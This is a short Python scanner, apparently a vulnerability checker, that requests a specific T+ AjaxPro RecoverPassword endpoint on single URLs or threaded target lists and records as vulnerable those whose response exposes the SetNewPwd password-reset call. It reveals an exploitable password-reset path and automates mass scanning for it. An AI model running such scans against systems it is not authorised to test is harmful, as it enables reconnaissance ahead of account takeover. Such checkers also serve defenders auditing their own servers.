##Sai1

import sys
import requests
import threading

# 锁定成功结果文件，避免多个线程同时写入导致冲突
success_file_lock = threading.Lock()

# 定义函数检测单个URL
def check_single_url(url):
    try:
        response = requests.get(url + '/tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx', timeout=10)

        # 判断响应体是否存在 pwdNew 字符串
        if 'return this.invoke("SetNewPwd", {"pwdNew":pwdNew}, this.SetNewPwd.getArguments().slice(1))' in response.text:
            print(f'{url} ===>>> 存在漏洞')
        else:
            print(f'{url} ===>>> 不存在漏洞')

    except requests.exceptions.Timeout:
        print(f'Error processing {url}: 请求超时')
    except requests.exceptions.ProxyError:
        # handle the ProxyError without printing any error messages
        pass
    except Exception as e:
        print(f'Error processing {url}: {str(e)}')

# 定义线程函数
def check_url(url):
    try:
        response = requests.get(url + '/tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx', timeout=10)

        # 判断响应体是否存在 pwdNew 字符串
        if 'return this.invoke("SetNewPwd", {"pwdNew":pwdNew}, this.SetNewPwd.getArguments().slice(1))' in response.text:
            with success_file_lock:
                print(f'{url} ===>>> 存在漏洞')
                with open('success.txt', 'a') as f:
                    f.write(f'存在漏洞：{url}\n')

    except requests.exceptions.Timeout:
        print(f'Error processing {url}: 请求超时')
    except requests.exceptions.ProxyError:
        # handle the ProxyError without printing any error messages
        pass
    except Exception as e:
        print(f'Error processing {url}: {str(e)}')

if len(sys.argv) == 2 and sys.argv[1].startswith('http'):
    url = sys.argv[1]
    check_single_url(url)
else:
    if len(sys.argv) != 2:
        print("Usage: ")
        print("python check.py targets.txt")
        print("python check.py http://127.0.0.1")
        sys.exit(1)

    filename = sys.argv[1]

    # 从文件中读取 URL 列表
    with open(filename, 'r') as f:
        urls = [line.strip() for line in f]

    # 创建线程池并启动线程
    threads = []
    for url in urls:
        t = threading.Thread(target=check_url, args=(url,))
        threads.append(t)
        t.start()

    # 等待所有线程完成
    for t in threads:
        t.join()
